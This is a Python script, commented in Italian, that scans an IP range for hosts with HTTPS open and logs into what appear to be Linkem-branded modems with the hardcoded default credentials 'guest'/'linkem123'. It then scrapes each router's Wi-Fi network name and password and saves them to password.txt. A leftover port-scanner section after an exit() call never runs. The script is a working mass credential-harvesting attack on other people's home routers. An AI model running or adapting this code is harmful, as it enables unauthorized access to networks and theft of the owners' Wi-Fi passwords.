import socket
import sys
import threading
import queue
import time
import os
import ipaddress
import requests
import multiprocessing
import multiprocessing.dummy

common_ports = {
    "21": "FTP",
    "22": "SSH",
    "23": "Telnet",
    "25": "SMTP",
    "53": "DNS",
    "80": "HTTP",
    "194": "IRC",
    "443": "HTTPS",
    "3306": "MySQL",
    "25565": "Minecraft"
}


def get_scan_args():
    if len(sys.argv) == 2:
        return (sys.argv[1], 0, 1024)
    elif len(sys.argv) == 3:
        return (sys.argv[1], 0, int(sys.argv[2]))
    elif len(sys.argv) == 4:
        return (sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))


def is_port_open(host, portx=80):  # Return boolean
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.3)
        sock.connect((host, portx))
        sock.close()

    except socket.error:
        return False
    return True


def scan_host(host):
    host = str(host)
    if is_port_open(host, 443):
        print(f"{host} is OPEN!")
        # Prova ad effettuare il login
        s = requests.Session()

        # DATI PER EFFETTUARE IL LOGIN CON CERTI MODEM
        # dati per effettuare il login
        payload = {"confirm_code": "",
                   "nosave_session_num": "",
                   "user_name": "guest",
                   "user_passwd": "linkem123"
                   }
        url_login = f'https://{host}/cgi-bin/sysconf.cgi?page=login.asp&action=login'
        try:
            # print('Effettuo il Login')
            r = s.request('POST', url=url_login, data=payload, verify=False, timeout=3)

            if r.status_code == 200:
                url_page_wifi = f'https://{host}/cgi-bin/sysconf.cgi?page=wifi_setting.asp&action=request'

                rw = s.request('GET', url=url_page_wifi, verify=False, timeout=3)

                if rw.status_code == 200:
                    lc = 0
                    for line in rw.iter_lines(decode_unicode=True):
                        lc += 1
                        if "multipleParameters" in line:
                            stringa = line.split('\t')
                            print(f'IP: {host} WiFi: {stringa[2]} Pass: {stringa[21]}')
                            f = open('password.txt', 'a+')
                            f.write(f"{stringa[2]}\t{stringa[21]}\t\n")
                            f.close()
                        if lc == 12:
                            break
        except:
            pass
    # else:
    #    pass # print(f"{host} is CLOSE!")


def scanner_worker_thread(host):
    while True:
        portx = port_queue.get()
        if is_port_open(host, portx):
            if str(portx) in common_ports:
                print("{}({}) is OPEN!".format(str(portx), common_ports[str(portx)]))
            else:
                print("{} is OPEN!".format(portx))
        port_queue.task_done()


if __name__ == "__main__":
    start_time = time.time()  # Inizializza il tempo di esecuzione
    os.system('clear')  # pulisci display
    scan_args = get_scan_args()  # argomento

    # disattiva i warning del certificato
    requests.packages.urllib3.disable_warnings()

    net4 = ipaddress.ip_network(scan_args[0], False)

    # Crea una lista di IP
    lista_ip = list()
    for host in net4.hosts():
        lista_ip.append(str(host))

    num_threads = 2 * multiprocessing.cpu_count()
    p = multiprocessing.dummy.Pool(num_threads)
    p.map(scan_host, lista_ip)

    # for host in net4.hosts():
    #     lista_ip.append(host)
    #     pass#scan_host(host)

# break

end_time = time.time()  # Fine tempo
print("Fatto! Scannerizzato in {:.3f} seconds.".format(end_time - start_time))
exit()
port_queue = queue.Queue()

for _ in range(20):
    t = threading.Thread(target=scanner_worker_thread, kwargs={"host": scan_args[0]})
    t.daemon = True
    t.start()

for port in range(scan_args[1], scan_args[2]):
    port_queue.put(port)

port_queue.join()
end_time = time.time()
